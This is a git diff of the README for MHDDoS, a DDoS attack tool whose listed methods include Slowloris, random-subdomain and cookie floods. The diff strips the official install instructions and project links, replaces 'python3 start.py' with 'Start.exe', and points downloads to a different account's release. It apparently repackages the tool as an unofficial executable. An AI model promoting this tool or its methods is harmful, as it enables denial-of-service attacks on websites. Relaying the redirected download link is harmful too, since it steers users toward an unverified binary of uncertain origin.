@@ -28,7 +28,6 @@
    * <img src="https://pbs.twimg.com/profile_images/1351562987224641544/IKb4q_yd_400x400.jpg" width="16" height="16" alt="dyn"> DYN | A New Method With Random SubDomain
    * <img src="https://cdn-icons-png.flaticon.com/512/6991/6991643.png" width="16" height="16" alt="downloader"> DOWNLOADER | A New Method of Reading data slowly
    * <img src="https://cdn2.iconfinder.com/data/icons/poison-and-venom-fill/160/loris2-512.png" width="16" height="16" alt="slow"> SLOW | Slowloris Old Method of DDoS
-   * <img src="https://lyrahosting.com/wp-content/uploads/2020/06/ddos-how-work-icon.png" width="16" height="16" alt="head"> HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD
    * <img src="https://img.icons8.com/plasticine/2x/null-symbol.png" width="16" height="16" alt="null"> NULL | Null UserAgent and ...
    * <img src="https://i.pinimg.com/originals/03/2e/7d/032e7d0755cd511c753bcb6035d44f68.png" width="16" height="16" alt="cookie"> COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'
    * <img src="https://cdn0.iconfinder.com/data/icons/dicticons-files-folders/32/office_pps-512.png" width="16" height="16" alt="pps"> PPS |  Only 'GET / HTTP/1.1\r\n\r\n'
@@ -70,7 +69,7 @@
 
 * ⚙️ Tools - Runs With 
 `
-python3 start.py tools
+Start.exe
 `
   * 🌟 CFIP | Find Real IP Address Of Websites Powered By Cloudflare
   * 🔪 DNS | Show DNS Records Of Sites
@@ -85,24 +84,11 @@ python3 start.py tools
   * 👑 HELP | Show Usage Script
 
 
-<h1 align="center">
-Our social's💻
-</h2> 
 
-<div align="center">
-   <img src="https://icon-library.com/images/github-icon-vector/github-icon-vector-27.jpg" width="96" height="96" alt="github" />
-   <img src="https://brandlogos.net/wp-content/uploads/2021/11/discord-logo.png"  width="96" height="96" alt="discord" />
-   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png" width="96" height="96" alt="telegram" />
-</div>
-
- * [Matrix Team Telegram group](https://t.me/DD0SChat)
- * [Matrix community Telegram channel](https://t.me/MatrixORG)
- * [GitHub](https://github.com/MatrixTM)
-### If u Like the project, leave a star on the repository!
 
 ## Downloads
 
-You can download it from [GitHub Releases](https://github.com/MatrixTM/MHDDoS/releases)
+You can download it from [GitHub Releases](https://github.com/Fushister/MHDDoS-v2-5.0/releases/tag/Update)
 
 ### Getting Started
 
@@ -112,7 +98,6 @@ You can download it from [GitHub Releases](https://github.com/MatrixTM/MHDDoS/re
 * [cfscrape](https://github.com/Anorov/cloudflare-scrape)
 * [impacket](https://github.com/SecureAuthCorp/impacket)
 * [requests](https://github.com/psf/requests)
-* [Python3][python3]
 * [PyRoxy](https://github.com/MatrixTM/PyRoxy)
 * [icmplib](https://github.com/ValentinBELYN/icmplib)
 * [certifi](https://github.com/certifi/python-certifi)
@@ -129,29 +114,6 @@ You can download it from [GitHub Releases](https://github.com/MatrixTM/MHDDoS/re
 
 * Aparat : https://aparat.com/v/XPn5Z
 * YouTube : Coming soon...
----
-
-## Documentation
-
-You can read it from [GitHub Wiki](https://github.com/MatrixTM/MHDDoS/wiki)
-
-**Clone and Install Script**
-
-```shell script
-git clone https://github.com/MatrixTM/MHDDoS.git
-cd MHDDoS
-pip install -r requirements.txt
-```
-
-**One-Line Installing on Fresh VPS**
-
-```shell script
-apt -y update && apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git && git clone https://github.com/MatrixTM/MHDDoS.git && cd MH* && pip3 install -r requirements.txt
-```
-
-[python3]: https://python.org 'Python3'
-[github issues]: https://github.com/MatrixTM/MHDDoS/issues 'enter'
-
 ---
 
 **💰 Donation Links:**
